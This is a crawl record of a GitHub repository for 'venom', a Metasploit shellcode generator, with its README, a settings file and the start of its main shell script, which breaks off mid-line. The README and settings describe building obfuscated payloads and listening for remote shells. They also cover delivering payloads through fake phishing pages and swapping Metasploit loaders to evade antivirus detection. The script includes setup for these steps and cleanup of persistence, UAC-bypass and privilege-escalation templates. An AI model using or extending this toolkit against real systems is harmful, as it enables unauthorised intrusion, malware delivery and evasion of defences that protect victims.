{
  "metadata": {
    "timestamp": 1736568479367,
    "page": 456,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjQ1OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "r00t-3xp10it/venom",
      "stars": 1803,
      "defaultBranch": "master",
      "files": [
        {
          "name": "README.md",
          "type": "blob",
          "size": 4.2060546875,
          "content": "<p align=\"center\">\n  <a href=\"https://github.com/r00t-3xp10it//github-readme-stats\">\n    <img\n      align=\"center\"\n      height=\"165\"\n      src=\"https://github-readme-stats.vercel.app/api?username=r00t-3xp10it&count_private=true&show_icons=true&custom_title=Github%20Status&hide=issues&theme=radical\"\n    />\n  </a>\n</p>\n\n[![Version](https://img.shields.io/badge/VENOM-1.0.17-brightgreen.svg?maxAge=259200)]()\n[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()\n[![Build](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)]()\n![licence](https://img.shields.io/badge/license-GPLv3-brightgreen.svg)\n![lastupdated](https://img.shields.io/aur/last-modified/venom)\n![languages](https://img.shields.io/github/languages/count/r00t-3xp10it/venom)\n![Open issues](https://img.shields.io/github/issues/r00t-3xp10it/venom?color=red&label=open%20issues)\n\n\n\n## VENOM 1.0.17 - metasploit Shellcode generator/compiller\n    Version release : v1.0.17\n    Author : pedro ubuntu  [ r00t-3xp10it ]\n    Codename: Aconite (Aconitum napellus)\n    Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS\n    Suspicious-Shell-Activity (SSA) RedTeam develop @2019\n\n![banner](https://user-images.githubusercontent.com/23490060/71019038-8cd1fa80-20f1-11ea-9cb3-795020d24481.png)\n\n\n#### LEGAL DISCLAMER\n    The author does not hold any responsibility for the bad use of this tool, remember that attacking\n    targets without prior consent is illegal and punished by law. So use this tool responsibly.\n\n\n\n#### FRAMEWORK DESCRIPTION\n    The script will use msfvenom (metasploit) to generate shellcode in diferent formats ( C# | python\n    | ruby | dll | msi | hta-psh | docm | apk | macho | elf | deb | mp4 | etc ) injects the shellcode\n    generated into one template (example: python) \"the python funtion will execute the shellcode into\n    ram\" and uses compilers like gcc (gnu cross compiler) or mingw32 or pyinstaller to build the\n    executable file. It also starts an handler to recive the remote connection (shell or meterpreter)\n\n    'venom' reproduces some of the technics used by Veil-Evasion.py, unicorn.py, powersploit.py, etc..\n\n\n#### HOW DO I DELIVER MY PAYLOADS TO TARGET HOST ?\n    venom 1.0.11 (malicious_server) was build to take advantage of apache2 webserver to deliver payloads\n    (LAN) using a fake webpage writen in html that takes advantage of <iframe> or <form> to be hable to\n    trigger payload downloads, the user just needs to send the link provided to target host.\n\n    \"Apache2 (malicious url) will copy all files needed to your webroot, and starts apache for you.\"\n\n![venom shellcode v1.0.17](http://i.cubeupload.com/nvmSq3.png)\n\n\n#### DEPENDENCIES\n    Zenity|Metasploit|GCC (compiler)|Pyinstaller (compiler)|mingw32 (compiler)|pyherion.py (crypter)\n    wine (emulator)|PEScrambler.exe (PE obfuscator)|apache2 (webserver)|winrar (wine)|shellter (KyRecon)\n    vbs-obfuscator (obfuscator)|avet (Daniel Sauder)|ettercap (MitM + DNS_Spoofing)|icmpsh (ICMP shell)\n    openssl (build SSL certs)|CarbonCopy (sign exe binarys)|ResourceHacker (wine)|NXcrypt(python crypter)\n\n    \"venom will download/install all dependencies as they are needed\". Adicionally was build the script\n    venom-main/aux/setup.sh to help you install all framework dependencies fast and easy.We just need to\n    install first the most importante dependencies before trigger setup.sh = zenity, metasploit, ettercap\n\n\n#### DOWNLOAD/INSTALL\n\n**1º - Download framework from github**<br />\n`git clone https://github.com/r00t-3xp10it/venom.git`\n\n**2º - Set execution permissions**<br />\n`cd venom`<br />\n`sudo find ./ -name \"*.sh\" -exec chmod +x {} \\;`<br />\n`sudo find ./ -name \"*.py\" -exec chmod +x {} \\;`<br />\n\n**3º - Install all dependencies**<br />\n`cd aux && sudo ./setup.sh`\n\n**4º - Run main tool**<br />\n`sudo ./venom.sh`\n\n**Update venom instalation** (compare local version againts github oficial version)<br />\n`sudo ./venom.sh -u`\n\n\n#### Framework Main Menu\n![banner](https://user-images.githubusercontent.com/23490060/71019038-8cd1fa80-20f1-11ea-9cb3-795020d24481.png)\n![venom shellcode v1.0.17](http://i.cubeupload.com/cVldOV.png)\n\n\n<br />\n\nDetailed info about release 1.0.17: https://github.com/r00t-3xp10it/venom/releases<br />\nSuspicious-Shell-Activity© (SSA) RedTeam develop @2019\n\n_EOF\n\n\n\n\n"
        },
        {
          "name": "aux",
          "type": "tree",
          "content": null
        },
        {
          "name": "bin",
          "type": "tree",
          "content": null
        },
        {
          "name": "obfuscate",
          "type": "tree",
          "content": null
        },
        {
          "name": "output",
          "type": "tree",
          "content": null
        },
        {
          "name": "settings",
          "type": "blob",
          "size": 4.88671875,
          "content": "##############################################################################\n#                                                                            #\n#    The following config file will allow you to customize settings within   #\n#    venom tool, The lines that Do not have comment code (\"#\") are the       #\n#    fields you want to toy with. There are additional options, read the     #\n#    comments For additional config settings.                                #\n#                                                                            #\n#    CHANGING THIS SETTINGS WILL AFFECT 'venom.sh' WAY OF WORKING            #\n#                                                                            #\n##############################################################################\n\n\n\n### Wine and mingw-gcc - Local system arch (32-bit/64-bit)\n# This next setting forces the main tool (venom.sh) to use WINE\n# and MINGW-GCC command syntax based on the arch sellected bellow.\n# SYNTAX: wine OR wine64 | i586-mingw32msvc-gcc OR i686-w64-mingw32-gcc\n---------------\nSYSTEM_ARCH=x86\n---------------\n\n\n\n### msf postgresql database connection check ? (msfdb reinit)\n# This next setting allow users to check msf postgresql\n# connection status and rebuild msfdb if not connected.\n# values accepted are: OFF or ON\n---------------\nMSF_REBUILD=OFF\n---------------\n\n\n\n### Build logfiles using metasploit ? (spool core command)\n# This next setting allow users to record session outputs\n# from msfconsole (handler) into venom-main/output folder.\n# values accepted are: OFF or ON\n----------------\nMSF_LOGFILES=OFF\n----------------\n\n\n\n### This function allow users to obfuscate the droppers build\n# by venom. And in 'amsi evasion' modules it will trigger dropper\n# Persistence, Obfuscation or Silent Executions using vbs scripts.\n---------------\nOBFUSCATION=OFF\n---------------\n\n\n\n### Update metasploit framework ? (msfupdate)\n# This next setting allow users to upgrade your metasploit\n# database with recent msf releases. (at script startup).\n# values accepted are: OFF or ON\n--------------\nMSF_UPDATE=OFF\n--------------\n\n\n\n### apache2 webroot installation full path.\n# This next config its needed to be able to upload\n# our builds into target machine (apache2 - malicious url).\n----------------------------\nAPACHE_WEBROOT=/var/www/html\n----------------------------\n\n\n\n### Wine drive_c install absoluct path\n# This next setting allow users to input\n# the absoluct path of wine install.\n-------------------------------\nWINE_DRIVEC=/root/.wine/drive_c\n-------------------------------\n\n\n\n\n### WinRar installation path inside WINE\n# This next setting allow users to input\n# the absoluct path of WinRar install.\n-----------------------------------------------------------------\nWinRAR_DRIVEC=/root/.wine/drive_c/Program Files/WinRAR/WinRAR.exe\n-----------------------------------------------------------------\n\n\n\n### Metasploit modules (auxiliarys) directory structure.\n# This next setting allow users to input the full path\n# where to copy venom toolkit msf_auxiliary_modules.\n--------------------------------------------------------\nPOST_EXPLOIT_DIR=/usr/share/metasploit-framework/modules\n--------------------------------------------------------\n\n\n\n### arno0x0x meterpreter_loader random stager bytes av bypass technic ..\n# This setting forces venom toolkit at startup to backup/replace the  msf meterpreter_loader.rb (x86)\n# and is counterpart (x86), rebuild msf database (msfdb) and reload venom meterpreter_loaders into msf.\n# The new loaders will add an arbitrary number of random bytes at the beginning of the stage being sent\n# back to the stager in an attempt to evade AV signature detection and run time detection.\n#\n# HINT: This option will only be available in windows/meterpreter loaders\n# HINT: the msf modules will be reverted to default at venom exit ..\n# values accepted are: OFF or ON\n-----------------------\nRANDOM_STAGER_BYTES=OFF\nMETERPRETER_STAGER=/usr/share/metasploit-framework/lib/msf/core/payload/windows\n-----------------------\n\n\n\n### Pyinstaller and Python versions (under WINE)\n# setup.sh only installs Python26 (python-2.6.6.msi)\n# pyinstaller-2.0 and pywin32-220 versions (32bit/64bit) ..\n#\n# HINT: If you have manually installed other versions of\n# this softwares, then we can use the follow settings to\n# force the main tool (venom.sh) to use them at working.\n-----------------------------------\nPYTHON_VERSION=Python26\nPYINSTALLER_VERSION=pyinstaller-2.0\n-----------------------------------\n\n\n\n########################################################################################\n# WARNING: DONT CHANGE THE FOLLOW SETTINGS - SETUP.SH WILL AUTO-CONFIG THIS SETTINGS   #\n# WARNING: venom.sh main tool depends of this follow configurations to proper work ..  #\n########################################################################################\n--------------------\nMEGAUPLOAD_DOMAIN=NO\n--------------------\nARP_SETTINGS=IPv4\nETTER_DNS_PATH=/etc/ettercap/etter.dns\n\n\n\n_EOF\n\n\n\n"
        },
        {
          "name": "templates",
          "type": "tree",
          "content": null
        },
        {
          "name": "venom.sh",
          "type": "blob",
          "size": 692.2626953125,
          "content": "#!/bin/sh\n# --------------------------------------------------------------\n# venom - metasploit Shellcode generator/compiler/listenner\n# Suspicious-Shell-Activity (SSA) RedTeam @2017 - @2020\n# codename: Shinigami (GPL licensed)\n# Stable version: 1.0.17\n# Dev version: 1.0.17.6\n# --------------------------------------------------------------\n# [INSTALL DEPENDENCIES]\n# cd aux && sudo ./setup.sh\n# --------------------------------------------------------------\n# Resize terminal windows size befor running the tool (gnome terminal)\n# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D\nresize -s 40 105 > /dev/null\n\n\n\n# --------------------\n# check if user is root\n# ---------------------\nif [ $(id -u) != \"0\" ]; then\n  echo \"[x] we need to be root to run this script...\"\n  echo \"[x] execute [ sudo ./venom.sh ] on terminal\"\n  exit\nfi\n\n\n\n# ------------------------------\n# Make sure ZENITY its installed\n# ------------------------------\nzen=$(which zenity)\nif ! [ \"$?\" -eq \"0\" ]; then\n   echo \"[x] zenity............................[ NOT found ]\";sleep 12\n   echo \"[i] Please Wait, installing dependencie...\";sleep 2\n   sudo apt-get install zenity\n   sleep 2;clear\nfi\n\n\n\n# -----------------------------------\n# Colorise shell Script output leters\n# -----------------------------------\nColors() {\nEscape=\"\\033\";\n  white=\"${Escape}[0m\";\n  RedF=\"${Escape}[31m\";\n  GreenF=\"${Escape}[32m\";\n  YellowF=\"${Escape}[33m\";\n  BlueF=\"${Escape}[34m\";\n  CyanF=\"${Escape}[36m\";\n  RedBg=\"${Escape}[1;3;7;31m\";\n  GreenBg=\"${Escape}[1;3;7;32m\";\nReset=\"${Escape}[0m\";\n}\n\n\n\nColors;\n# ----------------------\n# variable declarations\n# ----------------------\nOS=`uname` # grab OS\nH0m3=`echo ~` # grab home path\nver=\"1.0.17\" # script version display\nC0d3=\"Shinigami\" # version codename display\nuser=`who | awk {'print $1'}` # grab username\n# user=`who | cut -d' ' -f1 | sort | uniq` # grab username\nDiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali\nIPATH=`pwd` # grab venom.sh install path (home/username/shell)\n# ------------------------------------------------------------------------\n# funtions [templates] to be injected with shellcode\n# ------------------------------------------------------------------------\nCh4Rs=\"$IPATH/output/chars.raw\" # shellcode raw output path\nInJEc=\"$IPATH/templates/exec.c\" # exec script path\nInJEc2=\"$IPATH/templates/exec.py\" # exec script path\nInJEc3=\"$IPATH/templates/exec_bin.c\" # exec script path\nInJEc4=\"$IPATH/templates/exec.rb\" # exec script path\nInJEc5=\"$IPATH/templates/exec_dll.c\" # exec script path\nInJEc6=\"$IPATH/templates/hta_attack/exec.hta\" # exec script path\nInJEc7=\"$IPATH/templates/hta_attack/index.html\" # hta index path\nInJEc8=\"$IPATH/templates/InvokePS1.bat\" # invoke-shellcode script path\nInJEc9=\"$IPATH/templates/exec0.py\" # exec script path\nInJEc10=\"$IPATH/templates/InvokeMeter.bat\" # exec script path\nInJEc11=\"$IPATH/templates/exec.php\" # php script path\n# phishing webpages to trigger RCE or downloads\nInJEc12=\"$IPATH/templates/phishing/mega.html\" # fake webpage script path\nInJEc13=\"$IPATH/templates/phishing/driveBy.html\" # fake webpage script path\nInJEc14=\"$IPATH/templates/hta_attack/index.html\" # fake webpage script path\nInJEc15=\"$IPATH/templates/exec_psh.c\" # c script path\nInJEc16=\"$IPATH/templates/exec.jar\" # jar script path\n\n\n# -------------------------------------------\n# SETTINGS FILE FUNTION (venom-main/settings)\n# -------------------------------------------\nChEk=`cat settings | egrep -m 1 \"MSF_REBUILD\" | cut -d '=' -f2` > /dev/null 2>&1\nMsFu=`cat settings | egrep -m 1 \"MSF_UPDATE\" | cut -d '=' -f2` > /dev/null 2>&1\nApAcHe=`cat settings | egrep -m 1 \"APACHE_WEBROOT\" | cut -d '=' -f2` > /dev/null 2>&1\nD0M4IN=`cat settings | egrep -m 1 \"MEGAUPLOAD_DOMAIN\" | cut -d '=' -f2` > /dev/null 2>&1\nDrIvC=`cat settings | egrep -m 1 \"WINE_DRIVEC\" | cut -d '=' -f2` > /dev/null 2>&1\nMsFlF=`cat settings | egrep -m 1 \"MSF_LOGFILES\" | cut -d '=' -f2` > /dev/null 2>&1\nPyIn=`cat settings | egrep -m 1 \"PYTHON_VERSION\" | cut -d '=' -f2` > /dev/null 2>&1\nPiWiN=`cat settings | egrep -m 1 \"PYINSTALLER_VERSION\" | cut -d '=' -f2` > /dev/null 2>&1\npHanTom=`cat settings | egrep -m 1 \"POST_EXPLOIT_DIR\" | cut -d '=' -f2` > /dev/null 2>&1\nArCh=`cat settings | egrep -m 1 \"SYSTEM_ARCH\" | cut -d '=' -f2` > /dev/null 2>&1\nUUID_RANDOM_LENGTH=\"70\" # build 23 uses random keys (comments) to evade signature detection (default 70)\nEnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1\n\n\n# --------------------------------------------\n# Config user system correct arch (wine+mingw)\n# --------------------------------------------\nif [ \"$ArCh\" = \"x86\" ]; then\n   arch=\"wine\"                 # Wine cmd line syntax\n   PgFi=\"Program Files\"        # Wine Program Files directory\n   ComP=\"i586-mingw32msvc-gcc\" # Mingw32 GCC library\nelif [ \"$ArCh\" = \"x64\" ]; then\n   arch=\"wine64\"               # Wine cmd line syntax\n   PgFi=\"Program Files\"        # Wine Program Files directory\n   ComP=\"i686-w64-mingw32-gcc\" # Mingw-W64 GCC library\nelse\n   echo \"${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}\"\n   echo \"${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}\"\n   exit\nfi\n\n\n# -----------------------------------------\n# msf postgresql database connection check?\n# -----------------------------------------\nif [ \"$ChEk\" = \"ON\" ]; then\necho ${BlueF}\ncat << !\n    ╔─────────────────────────────────────────────────╗\n    |  postgresql metasploit database connection fix  |\n    ╚─────────────────────────────────────────────────╝\n!\n\n  #\n  # start msfconsole to check postgresql connection status\n  #\n  service postgresql start\n  echo ${BlueF}[☠]${white} Checking msfdb connection status ..${Reset}\n  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`\n  if [ \"$ih\" != \"connected\" ]; then\n    echo ${RedF}[x]${white} postgresql selected, no connection ..${Reset}\n    echo ${BlueF}[☠]${white} Please wait, rebuilding msf database ..${Reset}\n    # rebuild msf database (database.yml)\n    echo \"\"\n    msfdb reinit | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Rebuild metasploit database\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n    echo \"\"\n    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}\n    sleep 2\n  else\n    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}\n    sleep 2\n  fi\nfi\n\n\n# -----------------------------------------------\n# update metasploit database before running tool?\n# -----------------------------------------------\nif [ \"$MsFu\" = \"ON\" ]; then\necho ${BlueF}\ncat << !\n    ╔─────────────────────────────────────────────────╗\n    | please wait fetching latest metasploit modules  |\n    ╚─────────────────────────────────────────────────╝\n!\n  xterm -T \" UPDATING MSF DATABASE \" -geometry 110x23 -e \"msfconsole -x 'msfupdate; exit -y' && sleep 2\"\nfi\n\n\n# -----------------------------------------------\n# venom framework configurated to store logfiles?\n# -----------------------------------------------\nif [ \"$MsFlF\" = \"ON\" ]; then\necho ${BlueF}\ncat << !\n    ╔─────────────────────────────────────────────────╗\n    | venom framework configurated to store logfiles  |\n    ╚─────────────────────────────────────────────────╝\n!\nsleep 2\nfi\n\n\n# ---------------------------------------------\n# grab Operative System distro to store IP addr\n# output = Ubuntu OR Kali OR Parrot OR BackBox\n# ---------------------------------------------\nInT3R=`netstat -r | grep \"default\" | awk {'print $8'}` # grab interface in use\ncase $DiStR0 in\n    Kali) IP=`ifconfig $InT3R | egrep -w \"inet\" | awk '{print $2}'`;;\n    Debian) IP=`ifconfig $InT3R | egrep -w \"inet\" | awk '{print $2}'`;;\n    Mint) IP=`ifconfig $InT3R | egrep -w \"inet\" | awk '{print $2}' | cut -d ':' -f2`;;\n    Ubuntu) IP=`ifconfig $InT3R | egrep -w \"inet\" | cut -d ':' -f2 | cut -d 'B' -f1`;;\n    Parrot) IP=`ifconfig $InT3R | egrep -w \"inet\" | cut -d ':' -f2 | cut -d 'B' -f1`;;\n    BackBox) IP=`ifconfig $InT3R | egrep -w \"inet\" | cut -d ':' -f2 | cut -d 'B' -f1`;;\n    elementary) IP=`ifconfig $InT3R | egrep -w \"inet\" | cut -d ':' -f2 | cut -d 'B' -f1`;;\n    *) IP=`zenity --title=\"☠ Input your IP addr ☠\" --text \"example: 192.168.1.68\" --entry --width 300`;;\n  esac\nclear\n\n\n# ------------------------------------\n# end of script internal settings and\n# display credits befor running module\n# ------------------------------------\n#                  - CodeName: $C0d3 -\necho ${BlueF} && clear && cat << !\n                              \n               __    _ ______  ____   _  _____  ____    __  \n              \\  \\  //|   ___||    \\ | |/     \\|    \\  /  |\n               \\  \\// |   ___||     \\| ||     ||     \\/   |\n                \\__/  |______||__/\\____|\\_____/|__/\\__/|__|\n!\necho \"${RedF}     Shellcode/Rat_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam @2020)${BlueF}\"\necho \"    ╔════════════════════════════════════════════════════════════════╗\"\necho \"    ║  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   ║\"\necho \"    ║  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} ║\"\necho \"    ║  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  ║\"\necho \"    ║  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      ║\"\necho \"    ╠════════════════════════════════════════════════════════════════╝\"\necho \"    ║ Author: r00t-3xp10it | Suspicious Shell Activity (Red Team)\"\necho \"    ╚ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0\"${Reset}\necho \"\" && echo \"\"\nsleep 1\necho ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}\nread op\n\n\n# -----------------------------------------\n# check dependencies (msfconsole + apache2)\n# -----------------------------------------\nimp=`which msfconsole`\nif [ \"$?\" -eq \"0\" ]; then\necho \"msfconsole found\" > /dev/null 2>&1\nelse\necho \"\"\necho ${RedF}[x]${white} msfconsole -> not found!${Reset}\necho ${BlueF}[☠]${white} This script requires msfconsole to work!${Reset}\nsleep 2\nexit\nfi\n\napc=`which apache2`\nif [ \"$?\" -eq \"0\" ]; then\necho \"apache2 found\" > /dev/null 2>&1\nelse\necho \"\"\necho ${RedF}[x]${white} apache2 -> not found!${Reset}\necho ${BlueF}[☠]${white} This script requires apache2 to work!${Reset}\nsleep 2\necho \"\"\necho ${BlueF}[☠]${white} Please run: cd aux && sudo ./setup.sh${Reset}\necho ${BlueF}[☠]${white} to install all missing dependencies...${Reset}\nexit\nfi\n\n\n# --------------------------------------------\n# start metasploit/postgresql/apache2 services\n# --------------------------------------------\nif [ \"$DiStR0\" = \"Kali\" ]; then\nservice postgresql start | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Starting postgresql service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n/etc/init.d/apache2 start | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Starting apache2 webserver\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\nelse\n/etc/init.d/metasploit start | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Starting metasploit service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n/etc/init.d/apache2 start | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Starting apache2 webserver\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\nfi\nclear\n\n\n# -----------------------------------------------\n# arno0x0x meterpreter loader random bytes stager\n# -----------------------------------------------\nChts=`cat settings | egrep -m 1 \"RANDOM_STAGER_BYTES\" | cut -d '=' -f2` > /dev/null 2>&1\nArNo=`cat settings | egrep -m 1 \"METERPRETER_STAGER\" | cut -d '=' -f2` > /dev/null 2>&1\nif [ \"$Chts\" = \"ON\" ]; then\n  if [ -e \"$IPATH/obfuscate/meterpreter_loader.rb\" ]; then\n    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}\n    sleep 2\n  else\necho ${BlueF}\ncat << !\n    ╔═════════════════════════════════════════════════════════════════════╗\n    ║  arno0x0x meterpreter_loader random bytes stager av bypass technic  ║\n    ║                              ---                                    ║\n    ║ This setting forces venom toolkit at startup to backup/replace the  ║\n    ║ msf meterpreter_loader.rb (x86) and is counter part (x64) adding an ║\n    ║ arbitrary number of random bytes at the beginning of the stage being║\n    ║sent back to the stager in an attempt to evade AV signature detection║\n    ╚═════════════════════════════════════════════════════════════════════╝\n\n!\nsleep 2\n    # backup msf modules\n    echo ${BlueF}[☠]${white} Backup default msf modules ..${Reset}\n    sleep 1\n    echo \"$ArNo/meterpreter_loader.rb\"\n    cp $ArNo/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader.rb\n    echo \"$ArNo/x64/meterpreter_loader.rb\"\n    cp $ArNo/x64/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader_64.rb\n    # replace default modules\n    echo ${BlueF}[☠]${white} Replace default modules by venom modules ..${Reset}\n    sleep 1\n    cp $IPATH/aux/msf/meterpreter_loader.rb $ArNo/meterpreter_loader.rb > /dev/null 2>&1\n    cp $IPATH/aux/msf/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb > /dev/null 2>&1\n    # start postgresql + reload msfdb\n    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}\n    sleep 1\n    msfdb reinit | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Rebuild metasploit database\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Reload metasploit database\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}\n    sleep 2\n  fi\nfi\nclear\n\n\n# ----------------------------------\n# bash trap ctrl-c and call ctrl_c()\n# ----------------------------------\ntrap ctrl_c INT\nctrl_c() {\necho \"${RedF}[x]${white} CTRL+C PRESSED -> ABORTING TASKS!\"${Reset}\nsleep 1\necho ${BlueF}[☠]${white} Cleanning temp generated files...${Reset}\n# just in case :D !!!\n# revert [templates] backup files to default stages\nmv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1\nmv $IPATH/templates/exec_bin[bak].c $InJEc3 > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1\nmv $IPATH/templates/exec_dll[bak].c $InJEc5 > /dev/null 2>&1\nmv $IPATH/templates/hta_attack/exec[bak].hta $InJEc6 > /dev/null 2>&1\nmv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1\nmv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1\nmv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/phishing/driveBy[bak].html $InJEc13 > /dev/null 2>&1\nmv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /dev/null 2>&1\nmv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1\nmv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1\nmv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1\nmv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1\nmv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1\n# delete temp generated files\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/templates/trigger.raw > /dev/null 2>&1\nrm $IPATH/templates/obfuscated.raw > /dev/null 2>&1\nrm $IPATH/templates/copy.c > /dev/null 2>&1\nrm $IPATH/templates/copy2.c > /dev/null 2>&1\nrm $IPATH/templates/final.c > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $IPATH/output/sedding.raw > /dev/null 2>&1\nrm $IPATH/output/payload.raw > /dev/null 2>&1\nrm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1\nrm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1\nrm $IPATH/bin/*.ps1 > /dev/null 2>&1\nrm $IPATH/bin/*.vbs > /dev/null 2>&1\nrm -r $H0m3/.psploit > /dev/null 2>&1\nrm $IPATH/bin/sedding.raw > /dev/null 2>&1\nrm $IPATH/obfuscate/final.vbs > /dev/null 2>&1\n# delete temp files from apache webroot\nrm $ApAcHe/installer.bat > /dev/null 2>&1\nrm $ApAcHe/trigger.sh > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/*.apk > /dev/null 2>&1\nrm $ApAcHe/*.exe > /dev/null 2>&1\nrm $ApAcHe/*.py > /dev/null 2>&1\nrm $ApAcHe/*.bat > /dev/null 2>&1\nrm $ApAcHe/*.deb > /dev/null 2>&1\n# delete pyinstaller temp files\nrm $IPATH/*.spec > /dev/null 2>&1\nrm -r $IPATH/dist > /dev/null 2>&1\nrm -r $IPATH/build > /dev/null 2>&1\n# delete rtf files\nrm /tmp/shell.exe > /dev/null 2>&1\nrm $ApAcHe/shell.exe > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm $ApAcHe/$N4m.rtf > /dev/null 2>&1\n# icmp (ping) shell\nif [ \"$ICMPDIS\" = \"disabled\" ]; then\n   echo \"${RedF}[x]${white} Local ICMP Replies are disable (enable ICMP replies)${white}\"\n   sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1\nfi\nrm $ApAcHe/$N4m.zip > /dev/null 2>&1\nrm $ApAcHe/$N4m.bat > /dev/null 2>&1\nrm $ApAcHe/icmpsh.exe > /dev/null 2>&1\n# exit venom.sh\necho ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}\necho ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}\nsleep 1\nif [ \"$DiStR0\" = \"Kali\" ]; then\nservice postgresql stop | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Stop postgresql service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n/etc/init.d/apache2 stop | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Stop apache2 service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\nelse\n/etc/init.d/metasploit stop | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Stop metasploit service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n/etc/init.d/apache2 stop | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Stop apache2 service\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\nfi\ncd $IPATH\ncd ..\nsudo chown -hR $user shell > /dev/null 2>&1\n\n\n# -----------------------\n# arno0x0x av obfuscation\n# ----------------------\nif [ \"$Chts\" = \"ON\" ]; then\n  if [ -e \"$IPATH/obfuscate/meterpreter_loader.rb\" ]; then\n    # backup msf modules\n    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: revert ..${Reset}\n    echo ${BlueF}[☠]${white} Revert default msf modules ..${Reset}\n    sleep 1\n    cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb\n    cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb\n    rm $IPATH/obfuscate/meterpreter_loader.rb\n    rm $IPATH/obfuscate/meterpreter_loader_64.rb\n    # reload msfdb\n    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}\n    sleep 1\n    msfdb reinit | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Rebuild metasploit database\" --percentage=0 --auto-close --width 300 > /dev/null 2>&1\n    msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title \"☠ PLEASE WAIT ☠\" --text=\"Reload metasploit database\" --percentage=0 --auto-close --width 300 > /dev/null 